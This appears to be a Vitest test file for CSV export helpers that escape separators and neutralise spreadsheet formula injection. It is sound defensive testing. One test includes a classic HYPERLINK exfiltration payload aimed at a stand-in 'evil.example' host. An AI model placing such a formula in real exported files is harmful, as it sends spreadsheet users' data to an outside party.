import { describe, it, expect } from 'vitest';
import { csvCell, csvRow } from '../csv';

describe('csvCell', () => {
  it('passes ordinary values through untouched', () => {
    expect(csvCell('Ada')).toBe('Ada');
    expect(csvCell('st-000001@sendtest.example.org')).toBe('st-000001@sendtest.example.org');
    expect(csvCell(42)).toBe('42');
  });

  it('renders null and undefined as empty', () => {
    expect(csvCell(null)).toBe('');
    expect(csvCell(undefined)).toBe('');
  });

  it('quotes and escapes separators', () => {
    expect(csvCell('Smith, Ada')).toBe('"Smith, Ada"');
    expect(csvCell('She said "hi"')).toBe('"She said ""hi"""');
    expect(csvCell('line1\nline2')).toBe('"line1\nline2"');
  });

  it('neutralises formula-leading characters', () => {
    // Opened in Excel/Sheets, these would otherwise execute rather than display.
    expect(csvCell('=1+1')).toBe("'=1+1");
    expect(csvCell('+44 123')).toBe("'+44 123");
    expect(csvCell('-5')).toBe("'-5");
    expect(csvCell('@SUM(A1)')).toBe("'@SUM(A1)");
  });

  it('neutralises the classic exfiltration payload and still quotes it', () => {
    const payload = '=HYPERLINK("http://evil.example/?d="&A1,"click")';
    const out = csvCell(payload);
    expect(out.startsWith('"\'=')).toBe(true);
    expect(out).toContain('""');
  });

  it('only treats the LEADING character as a formula start', () => {
    expect(csvCell('Ada=Lovelace')).toBe('Ada=Lovelace');
    expect(csvCell('a-b')).toBe('a-b');
  });
});

describe('csvRow', () => {
  it('joins escaped cells', () => {
    expect(csvRow(['a@b.com', 'Ada', 'Lovelace', 'UTC', 1])).toBe('a@b.com,Ada,Lovelace,UTC,1');
  });
});
